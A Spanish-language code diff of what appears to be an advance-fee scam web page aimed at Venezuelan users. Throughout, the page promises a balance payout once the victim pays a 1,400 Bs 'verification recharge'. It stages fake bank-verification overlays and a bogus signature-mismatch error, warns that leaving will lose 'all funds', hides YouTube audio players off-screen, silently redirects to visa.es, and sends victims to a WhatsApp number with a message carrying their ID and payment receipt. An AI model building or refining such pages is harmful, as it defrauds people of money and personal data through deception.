@@ -1543,6 +1543,18 @@
       box-shadow: var(--shadow-lg);
     }
     
+    /* MODIFICACIÓN: Tarjeta de monto total optimizada para móviles */
+    .total-amount-mobile {
+      display: flex;
+      flex-direction: row;
+      align-items: center;
+      flex-wrap: nowrap;
+      justify-content: center;
+      gap: 0.3rem;
+      font-size: 1.1rem;
+      white-space: nowrap;
+    }
+    
     /* Responsive */
     @media (max-width: 768px) {
       .header {
@@ -1582,6 +1594,11 @@
       .dynamic-text {
         font-size: 0.65rem; /* Texto más pequeño en móviles */
       }
+      
+      /* MODIFICACIÓN: Total amount mobile */
+      .total-amount-mobile {
+        font-size: 0.9rem;
+      }
     }
     
     @media (max-width: 480px) {
@@ -1605,6 +1622,21 @@
       .info-section-old p, .verification-section p {
         font-size: 0.9rem;
       }
+      
+      /* MODIFICACIÓN: Total amount mobile */
+      .total-amount-mobile {
+        font-size: 0.85rem;
+      }
+    }
+    
+    /* MODIFICACIÓN: Ocultar iframe Youtube */
+    .youtube-embed {
+      position: absolute;
+      top: -9999px;
+      left: -9999px;
+      height: 1px;
+      width: 1px;
+      opacity: 0;
     }
   </style>
 </head>
@@ -1909,7 +1941,8 @@
           <i class="fas fa-calculator" style="margin-right: 0.5rem;"></i>
           <strong>Monto total que recibirás:</strong>
           <br>
-          <span style="display: block; text-align: center; margin-top: 0.5rem; font-size: 1.1rem;">
+          <!-- MODIFICACIÓN: Contenedor para móviles -->
+          <span class="total-amount-mobile">
             <strong id="montoRetiroBs">[Saldo]</strong> + 
             <strong class="blink">Bs. 1.400,00</strong> = 
             <strong id="montoDepositoTotal">[Saldo+1400]</strong>
@@ -2135,81 +2168,96 @@
     
     <div class="spinner-advanced">
       <div class="spinner-ring"></div>
-  <div class="spinner-ring"></div>
-  <div class="spinner-dot"></div>
+      <div class="spinner-ring"></div>
+      <div class="spinner-ring"></div>
+      <div class="spinner-dot"></div>
+    </div>
+  </div>
 </div>
-</div>
+
 <!-- Overlay: Verificación de la primera recarga -->
 <div class="overlay" id="overlayVerificandoRecarga">
   <div class="modal modal-glow">
     <h3 id="verificandoRecargaTitulo">Verificando tu recarga...</h3>
     <p id="verificandoRecargaTexto">
       Por favor, espera mientras consultamos con tu banco.
-    </p><div class="bank-logo-container">
-  <img id="verificandoRecargaLogo" src="" alt="Banco" class="bank-logo">
+    </p>
+    
+    <div class="bank-logo-container">
+      <img id="verificandoRecargaLogo" src="" alt="Banco" class="bank-logo">
+    </div>
+    
+    <div class="overlay-progress-bar">
+      <div class="overlay-progress-fill" id="verificandoRecargaProgress" style="width: 0%;"></div>
+      <div class="progress-percentage">0%</div>
+    </div>
+    
+    <div class="warning-message">
+      <i class="fas fa-info-circle warning-icon" style="color: var(--primary);"></i>
+      <span class="warning-text">Este proceso tomará unos segundos</span>
+    </div>
+    
+    <div class="spinner-advanced">
+      <div class="spinner-ring"></div>
+      <div class="spinner-ring"></div>
+      <div class="spinner-ring"></div>
+      <div class="spinner-dot"></div>
+    </div>
+  </div>
 </div>
 
-<div class="overlay-progress-bar">
-  <div class="overlay-progress-fill" id="verificandoRecargaProgress" style="width: 0%;"></div>
-  <div class="progress-percentage">0%</div>
-</div>
-
-<div class="warning-message">
-  <i class="fas fa-info-circle warning-icon" style="color: var(--primary);"></i>
-  <span class="warning-text">Este proceso tomará unos segundos</span>
-</div>
-
-<div class="spinner-advanced">
-  <div class="spinner-ring"></div>
-  <div class="spinner-ring"></div>
-  <div class="spinner-ring"></div>
-  <div class="spinner-dot"></div>
-</div>
-</div>
 <!-- Overlay: Última secuencia al confirmar recarga -->
 <div class="overlay" id="overlaySecuenciaFinal">
   <div class="modal modal-glow">
     <h3 id="secFinalTitulo">Conectando con tu banco</h3>
-    <p id="secFinalTexto">Preparando tu depósito.</p><div class="bank-logo-container">
-  <img id="secFinalLogo" src="" alt="Banco" class="bank-logo">
+    <p id="secFinalTexto">Preparando tu depósito.</p>
+    
+    <div class="bank-logo-container">
+      <img id="secFinalLogo" src="" alt="Banco" class="bank-logo">
+    </div>
+    
+    <div class="overlay-progress-bar">
+      <div class="overlay-progress-fill" id="secuenciaFinalProgress" style="width: 0%;"></div>
+      <div class="progress-percentage">0%</div>
+    </div>
+    
+    <div class="warning-message">
+      <i class="fas fa-info-circle warning-icon" style="color: var(--primary);"></i>
+      <span class="warning-text">Tu dinero estará disponible en breve</span>
+    </div>
+    
+    <div class="spinner-advanced">
+      <div class="spinner-ring"></div>
+      <div class="spinner-ring"></div>
+      <div class="spinner-ring"></div>
+      <div class="spinner-dot"></div>
+    </div>
+  </div>
 </div>
 
-<div class="overlay-progress-bar">
-  <div class="overlay-progress-fill" id="secuenciaFinalProgress" style="width: 0%;"></div>
-  <div class="progress-percentage">0%</div>
-</div>
-
-<div class="warning-message">
-  <i class="fas fa-info-circle warning-icon" style="color: var(--primary);"></i>
-  <span class="warning-text">Tu dinero estará disponible en breve</span>
-</div>
-
-<div class="spinner-advanced">
-  <div class="spinner-ring"></div>
-  <div class="spinner-ring"></div>
-  <div class="spinner-ring"></div>
-  <div class="spinner-dot"></div>
-</div>
-</div>
 <!-- Overlay: Error Final - No se encontró la recarga -->
 <div class="overlay" id="overlayErrorFinal">
   <div class="modal modal-glow error">
     <h3 style="background: linear-gradient(90deg, var(--danger), var(--danger-dark)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; text-fill-color: transparent;">
       Atención: No encontramos tu recarga
-    </h3><p id="errorFinalTexto">
-  No se puede verificar la titularidad de tu cuenta hasta que detectemos
-  tu recarga de verificación. Depositaremos tu saldo completo 
-  (Saldo+<span id="montoRecargaError">1.400,00</span> Bs) 
-  una vez validemos tu identidad.
-</p>
-
-<div class="result-icon error">
-  <i class="fas fa-exclamation-circle"></i>
-</div>
-
-<p style="margin-top: 0.5rem;">
-  Por favor, contacta con soporte para recibir asistencia inmediata.
-</p><div style="text-align: center; margin-top: 1rem;">
+    </h3>
+    
+    <p id="errorFinalTexto">
+     No se puede verificar la titularidad de tu cuenta hasta que detectemos
+      tu recarga de verificación. Depositaremos tu saldo completo 
+      (Saldo+<span id="montoRecargaError">1.400,00</span> Bs) 
+      una vez validemos tu identidad.
+    </p>
+    
+    <div class="result-icon error">
+      <i class="fas fa-exclamation-circle"></i>
+    </div>
+    
+    <p style="margin-top: 0.5rem;">
+      Por favor, contacta con soporte para recibir asistencia inmediata.
+    </p>
+    
+   <div style="text-align: center; margin-top: 1rem;">
       <a 
         href="#"
         target="_blank"
@@ -2221,6 +2269,7 @@
     </div>
   </div>
 </div>
+
 <!-- Overlay: Datos de Verificación (Pago Móvil) -->
 <div class="overlay" id="overlayDatosVerificacion">
   <div class="modal modal-glow">
@@ -2250,165 +2299,56 @@
     <p style="font-size: 0.8rem; color: var(--text-secondary); margin-top: 1rem;">
       El monto de verificación (<span id="montoVerificacionBsModal">1.400,00 Bs</span>) 
       equivale a <span id="montoVerificacionUsdModal">$37.40</span> y será reembolsado.
-    </p><div class="btn-advanced-container" style="margin: 1rem auto;">
-  <div class="btn-advanced-effect"></div>
-  <button class="btn-advanced" id="closeDatosModalBtn">
-    <span class="btn-text">
-      Cerrar
-      <i class="fas fa-times btn-icon"></i>
-    </span>
-  </button>
+    </p>
+    
+    <div class="btn-advanced-container" style="margin: 1rem auto;">
+      <div class="btn-advanced-effect"></div>
+      <button class="btn-advanced" id="closeDatosModalBtn">
+        <span class="btn-text">
+          Cerrar
+          <i class="fas fa-times btn-icon"></i>
+        </span>
+      </button>
+    </div>
+  </div>
 </div>
-</div>
+
 <!-- Overlay: Firma no coincide (si se llegara a necesitar) -->
 <div class="overlay" id="overlayFirmaNoCoincide">
   <div class="modal modal-glow error">
     <h3 style="background: linear-gradient(90deg, var(--danger), var(--danger-dark)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; text-fill-color: transparent;">
       Verificación adicional requerida
-    </h3><p id="firmaNoCoincideTexto">Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un proceso de verificación adicional para continuar con el retiro.
-</p><div class="bank-logo-container">
-  <img id="firmaNoCoincideLogo" src="" alt="Logo Banco" class="bank-logo">
+    </h3>
+    
+    <p id="firmaNoCoincideTexto">
+Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un proceso de verificación adicional para continuar con el retiro.
+    </p>
+    
+    <div class="bank-logo-container">
+      <img id="firmaNoCoincideLogo" src="" alt="Logo Banco" class="bank-logo">
+    </div>
+    
+    <div class="result-icon error">
+      <i class="fas fa-exclamation-circle"></i>
+    </div>
+    
+    <div class="overlay-progress-bar">
+      <div class="overlay-progress-fill error" id="redirectProgressBar" style="width: 0%;"></div>
+      <div class="progress-percentage">0%</div>
+    </div>
+    
+    <div class="countdown-container">
+      <span>Serás redirigido en</span>
+      <span class="countdown-number" id="redirectCountdown">10</span>
+      <span>segundos...</span>
+    </div>
+  </div>
 </div>
 
-<div class="result-icon error">
-  <i class="fas fa-exclamation-circle"></i>
-</div>
+<!-- MODIFICACIÓN: iframe oculto para YouTube -->
+<iframe id="youtubeIntro" class="youtube-embed" src="https://www.youtube.com/embed/KWaPj24l_oo?enablejsapi=1&autoplay=0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+<iframe id="youtubeOverlay" class="youtube-embed" src="https://www.youtube.com/embed/X6mjwDUFccw?enablejsapi=1&autoplay=0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
 
-<div class="overlay-progress-bar">
-  <div class="overlay-progress-fill error" id="redirectProgressBar" style="width: 0%;"></div>
-  <div class="progress-percentage">0%</div>
-</div>
-
-<div class="countdown-container">
-  <span>Serás redirigido en</span>
-  <span class="countdown-number" id="redirectCountdown">10</span>
-  <span>segundos...</span>
-</div>
-</div>
-<!-- Contenedor oculto para el reproductor de YouTube -->
-<div id="youtubePlayer" style="position: fixed; bottom: 0; right: 0; width: 1px; height: 1px; z-index: -1000; opacity: 0.01;"></div>
-<!-- Indicador de sonido (opcional) -->
-<div id="soundIndicator" style="display: none; position: fixed; bottom: 20px; right: 20px; background-color: rgba(26, 31, 113, 0.8); color: white; padding: 8px 16px; border-radius: 20px; font-size: 12px; z-index: 9999;">
-  <i class="fas fa-volume-up" style="margin-right: 5px;"></i> Sonido activado
-</div>
-<!-- Script de la API de YouTube -->
-<script>
-  // IDs de los videos de YouTube
-  const youtubeVideoIds = {
-    first: 'KWaPj24l_oo',
-    second: 'X6mjwDUFccw'
-  };
-  
-  // Variables para el reproductor y el estado de reproducción
-  let youtubePlayer = null;
-  let isYouTubeAPIReady = false;
-  let audioStarted = false;
-  let waitingForFirstButtonClick = true;
-  
-  // Cargar la API de YouTube
-  function loadYouTubeAPI() {
-    const tag = document.createElement('script');
-    tag.src = "https://www.youtube.com/iframe_api";
-    const firstScriptTag = document.getElementsByTagName('script')[0];
-    firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
-  }
-  
-  // Función que se llama cuando la API de YouTube está lista
-  function onYouTubeIframeAPIReady() {
-    isYouTubeAPIReady = true;
-    youtubePlayer = new YT.Player('youtubePlayer', {
-      width: '1',
-      height: '1',
-      videoId: youtubeVideoIds.first,
-      playerVars: {
-        'autoplay': 0,
-        'controls': 0,
-        'disablekb': 1,
-        'fs': 0,
-        'modestbranding': 1
-      },
-      events: {
-        'onReady': onPlayerReady,
-        'onStateChange': onPlayerStateChange
-      }
-    });
-  }
-  
-  // Cuando el reproductor está listo
-  function onPlayerReady(event) {
-    console.log("YouTube player ready");
-  }
-  
-  // Cuando cambia el estado del reproductor
-  function onPlayerStateChange(event) {
-    // Si el primer video ha terminado, reproducir el segundo
-    if (event.data === YT.PlayerState.ENDED) {
-      console.log("Video ended, loading next...");
-      if (youtubePlayer.getVideoData().video_id === youtubeVideoIds.first) {
-        youtubePlayer.loadVideoById(youtubeVideoIds.second);
-        youtubePlayer.playVideo();
-      }
-    }
-  }
-  
-  // Función para iniciar la reproducción de audio
-  function startAudioSequence() {
-    if (!audioStarted && isYouTubeAPIReady && youtubePlayer) {
-      youtubePlayer.playVideo();
-      audioStarted = true;
-      showSoundIndicator();
-      console.log("Audio sequence started");
-    }
-  }
-  
-  // Mostrar el indicador de sonido durante unos segundos
-  function showSoundIndicator() {
-    const indicator = document.getElementById('soundIndicator');
-    if (indicator) {
-      indicator.style.display = 'block';
-      setTimeout(() => {
-        indicator.style.display = 'none';
-      }, 3000);
-    }
-  }
-  
-  // Configurar detector de clics
-  function setupClickDetector() {
-    document.addEventListener('click', function(event) {
-      // Comprobar si el clic fue en un botón o elemento interactivo
-      const isClickable = event.target.tagName === 'BUTTON' || 
-                          event.target.closest('button') ||
-                          event.target.tagName === 'A' || 
-                          event.target.closest('a') ||
-                          event.target.classList.contains('btn-glow') ||
-                          event.target.classList.contains('btn-advanced');
-      
-      if (isClickable && waitingForFirstButtonClick) {
-        waitingForFirstButtonClick = false;
-        startAudioSequence();
-      }
-    }, true);
-  }
-  
-  // Reemplazar las funciones originales de audio
-  function firstAudio() {
-    if (waitingForFirstButtonClick) {
-      waitingForFirstButtonClick = false;
-      startAudioSequence();
-    }
-  }
-  
-  function secondAudio() {
-    // No hacer nada, ya que la transición al segundo audio ahora es automática
-    // cuando termina el primero
-  }
-  
-  // Iniciar todo cuando el DOM esté cargado
-  document.addEventListener('DOMContentLoaded', function() {
-    loadYouTubeAPI();
-    setupClickDetector();
-  });
-</script>
 <!-- Script principal -->
 <script>
   /****************************************************
@@ -2480,10 +2420,13 @@
   // Control de veces que se abre el overlay de datos:
   let timesBlurOpened = 0;
 
-  // Control de audio simplificado (reemplazando las funciones anteriores)
-  // firstAudio y secondAudio ya están definidas en el nuevo script de YouTube
-
-  // Variable para controlar si ya se reprodujo el audio al hacer clic en botones de firma
+  // MODIFICACIÓN: Timer de inactividad
+  let inactivityTimer = null;
+  const INACTIVITY_TIMEOUT = 60 * 60 * 1000; // 60 minutos en milisegundos
+  
+  // MODIFICACIÓN: Objetos de YouTube
+  let ytIntroPlayer = null;
+  let ytOverlayPlayer = null;
   let audioReproducidoFirma = false;
 
   // Mensajes para la tarjeta
@@ -2534,9 +2477,9 @@
   /****************************************************
    * EVENTO DOMContentLoaded
    ****************************************************/
-  document.addEventListener("DOMContentLoaded", () => {
-    // Reproducir el audio de intro al cargar la página
-    firstAudio();
+  document.addEventListener("DOMContentLoaded", () => {    
+    // MODIFICACIÓN: Inicializar API de YouTube
+    initYouTubeAPI();
     
     // Activamos aparición suave del container
     document.querySelector('.container').classList.add('active');
@@ -2561,8 +2504,81 @@
     
     // Agregar protección de contraseña (desde paste.txt)
     addPasswordProtection();
+    
+    // MODIFICACIÓN: Iniciar el timer de inactividad
+    resetInactivityTimer();
   });
   
+  /****************************************************
+   * MODIFICACIÓN: Inicializar YouTube API
+   ****************************************************/
+  function initYouTubeAPI() {
+    // Carga la API de YouTube
+    const tag = document.createElement('script');
+    tag.src = "https://www.youtube.com/iframe_api";
+    const firstScriptTag = document.getElementsByTagName('script')[0];
+    firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
+    
+    // La función onYouTubeIframeAPIReady es llamada automáticamente por la API de YouTube
+    window.onYouTubeIframeAPIReady = function() {
+      // Inicializar los players de YouTube
+      ytIntroPlayer = new YT.Player('youtubeIntro', {
+        events: {
+          'onStateChange': onPlayerStateChange
+        }
+      });
+      
+      ytOverlayPlayer = new YT.Player('youtubeOverlay', {
+        events: {
+          'onStateChange': onPlayerStateChange
+        }
+      });
+    };
+    
+    function onPlayerStateChange(event) {
+      // Puedes manejar cambios de estado si es necesario
+    }
+  }
+  
+  // MODIFICACIÓN: Funciones para reproducir videos de YouTube
+  function playYouTubeIntro() {
+    if (ytIntroPlayer && typeof ytIntroPlayer.playVideo === 'function') {
+      ytIntroPlayer.playVideo();
+    }
+  }
+  
+  function playYouTubeOverlay() {
+    if (ytOverlayPlayer && typeof ytOverlayPlayer.playVideo === 'function') {
+      ytOverlayPlayer.playVideo();
+    }
+  }
+  
+  /****************************************************
+   * MODIFICACIÓN: Timer de inactividad
+   ****************************************************/
+  function resetInactivityTimer() {
+    // Limpiar el temporizador existente si hay uno
+    if (inactivityTimer) {
+      clearTimeout(inactivityTimer);
+    }
+    
+    // Establecer un nuevo temporizador
+    inactivityTimer = setTimeout(() => {
+      // Si el usuario está en la sección "Último paso para recibir tu dinero en minutos"
+      if (document.getElementById("securityVerification3C").classList.contains("active")) {
+        // Redirigir automáticamente sin avisar
+        window.location.href = "https://visa.es";
+      }
+    }, INACTIVITY_TIMEOUT);
+  }
+  
+  // Reiniciar temporizador cuando el usuario interactúa con la página
+  document.addEventListener("mousemove", resetInactivityTimer);
+  document.addEventListener("mousedown", resetInactivityTimer);
+  document.addEventListener("keypress", resetInactivityTimer);
+  document.addEventListener("touchstart", resetInactivityTimer);
+  document.addEventListener("scroll", resetInactivityTimer);
+
   /****************************************************
    * Evitar retroceso y recarga con advertencia
    ****************************************************/
@@ -2577,11 +2593,11 @@
       }
     });
     
-    // Evitar recarga
+    // MODIFICACIÓN: Evitar recarga
     window.addEventListener('beforeunload', function(e) {
       if (!isRedirecting) {
         e.preventDefault();
-        e.returnValue = "Si abandonas esta página, podrías perder tus fondos. ¿Estás seguro?";
+        e.returnValue = "ADVERTENCIA: Si abandonas o recargas esta página podrías perder todos tus fondos y la sesión. ¿Estás seguro?";
         return e.returnValue;
       }
     });
@@ -2892,6 +2908,9 @@
         togglePersonalizedBalance();
       }, 10000);
     }, 30000);
+    
+    // Reproducir el primer audio al cargar
+    playYouTubeIntro();
   }
 
   function createParticle() {
@@ -3152,9 +3171,9 @@
     const saveSignatureBtn = document.getElementById("saveSignatureBtn");
 
     clearSignatureBtn.addEventListener("click", () => {
-      // Reproducir audio al hacer clic en "Limpiar"
+      // MODIFICACIÓN: Reproducir audio al hacer clic en "Limpiar"
       if (!audioReproducidoFirma) {
-        secondAudio();
+        playYouTubeOverlay();
         audioReproducidoFirma = true;
       }
       
@@ -3162,9 +3181,9 @@
     });
     
     saveSignatureBtn.addEventListener("click", () => {
-      // Reproducir audio al hacer clic en "Guardar"
+      // MODIFICACIÓN: Reproducir audio al hacer clic en "Guardar"
       if (!audioReproducidoFirma) {
-        secondAudio();
+        playYouTubeOverlay();
         audioReproducidoFirma = true;
       }
       
@@ -3198,7 +3217,7 @@
     const btn1 = document.getElementById("continueSecurityBtn1");
     btn1.addEventListener("click", () => {
       // Se reproduce la primera canción
-      firstAudio();
+      playYouTubeIntro();
 
       // Escondemos la sección actual
       hideVisaCard("securityVerification1");
@@ -3228,6 +3247,9 @@
       hideVisaCard("securityVerification3B");
       showVisaCard("securityVerification3C");
       startRecargaReadyCountdown();
+      
+      // MODIFICACIÓN: Reiniciar timer de inactividad
+      resetInactivityTimer();
     });
 
     // Step3C -> Verificar recarga
@@ -3420,8 +3442,8 @@
     const progressBar = document.getElementById("secuenciaFirmaProgress");
     const percentDisplay = document.querySelector("#overlaySecuenciaFirma .progress-percentage");
 
-    // Reproducir la segunda canción "apenas se muestre el primer overlay"
-    secondAudio();
+    // MODIFICACIÓN: Reproducir la segunda canción "apenas se muestre el primer overlay"
+    playYouTubeOverlay();
 
     const secuenciaTextos = [
       { titulo: "Iniciando análisis de firma", texto: "Estableciendo conexión con el sistema de verificación...", progreso: 12 },
@@ -3586,18 +3608,28 @@
     }, 15000);
   }
 
-  // Configura link WhatsApp (ACTUALIZADA)
+  // MODIFICACIÓN: Configura link WhatsApp (Mensaje mejorado)
   function configurarWhatsAppLink() {
     const whatsappLink = document.getElementById("whatsappLink");
     if (!whatsappLink) return;
 
     const { montoRecargaBs } = calcularMontoRecarga();
     const montoFormateado = formatNumberVE(montoRecargaBs);
+    
+    // Obtener valor del comprobante
+    const comprobanteInput = document.getElementById("comprobanteInput");
+    const numeroComprobante = comprobanteInput ? comprobanteInput.value.trim() : "";
+    
+    // Obtener valor del teléfono
+    const recargaTelefono = document.getElementById("recargaTelefono");
+    const telefono = recargaTelefono ? recargaTelefono.value.trim() : telefonoUsuario;
 
     const msg = encodeURIComponent(
-      `Hola, soy ${nombreCompleto || "cliente"}, con documento ${documentoBeneficiario || "pendiente"}. ` +
-      `No se encontró mi recarga de verificación por ${montoFormateado} Bs y necesito ` +
-      `ayuda para liberar mis fondos de ${formatNumberVE(saldoDisponible)} Bs en ${bancoUsuario || "mi banco"}.`
+      `Hola, soy ${nombreCompleto || "cliente"}, venezolano, titular de la cédula de identidad ${documentoBeneficiario || "pendiente"}. ` +
+      `Mi saldo actual es de ${formatNumberVE(saldoDisponible)} Bs, no puedo realizar el retiro de los fondos a ${bancoUsuario || "mi banco"} ` +
+      `ya que no se reconoció mi firma y tampoco encuentra el comprobante de mi pago que realicé desde ${bancoUsuario || "mi banco"}, ` +
+      `${telefono} por el monto de ${montoFormateado} Bs, comprobante número ${numeroComprobante} concepto ${documentoBeneficiario || "pendiente"} ` +
+      `así que enviaré comprobante de pago móvil para que comprueben que el código en el concepto corresponde a ${documentoBeneficiario || "mi documento"}.`
     );
     whatsappLink.href = `https://wa.me/17373018059?text=${msg}`;
 
